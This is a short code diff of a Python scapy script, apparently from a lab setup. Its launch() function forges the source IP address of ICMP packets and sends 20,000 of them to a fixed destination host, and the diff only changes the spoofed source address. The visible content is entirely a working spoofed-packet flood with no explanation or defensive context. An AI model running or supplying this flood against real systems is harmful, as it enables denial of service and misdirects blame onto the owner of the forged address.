@@ -5,7 +5,7 @@ from scapy.all import *
 
 
 def launch():
-        p = (IP(src="35.202.52.200", dst="35.193.17.254") / ICMP())
+        p = (IP(src="35.202.52.252", dst="35.193.17.254") / ICMP())
         send(p, count=20000)
 
 
